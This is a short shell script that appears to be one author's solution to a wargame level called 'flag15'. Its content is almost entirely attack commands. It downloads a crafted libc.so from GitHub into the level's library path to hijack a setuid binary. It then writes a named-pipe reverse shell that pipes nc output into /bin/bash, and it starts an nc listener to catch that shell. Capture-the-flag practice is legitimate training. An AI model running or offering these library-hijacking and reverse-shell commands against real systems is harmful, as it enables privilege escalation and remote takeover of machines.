# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

#NOTE: The main solution relies in the crafted libc.so

wget https://github.com/downloads/dNetGuru/SandBox/libc.so -O /var/tmp/flag15/libc.so.6
echo "rm -rf /tmp/bp; mknod /tmp/bp p && /bin/nc 127.0.10.205 1337 0< /tmp/bp | /bin/bash 1>/tmp/bp" > /tmp/dNet
/home/flag15/flag15 & nc -l 1337 -v -v
